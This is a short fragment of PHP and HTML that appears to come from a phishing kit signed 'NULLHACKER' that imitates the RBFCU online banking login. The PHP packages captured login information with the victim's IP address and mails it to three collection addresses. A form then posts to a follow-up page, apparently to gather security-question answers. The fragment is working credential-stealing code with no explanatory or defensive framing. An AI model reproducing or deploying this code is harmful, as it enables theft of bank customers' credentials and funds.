...
$msg .= "#-------------------[ NULLHACKER - END ]------------------------#\n\n";
$sub = "::NULLHACKER:: RBFCU Online Login Information Two: $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);
...
<form action="question2.php"  method="post" style="max-width: 400px;padding: 15px;text-align: center;margin-top: 20px;">
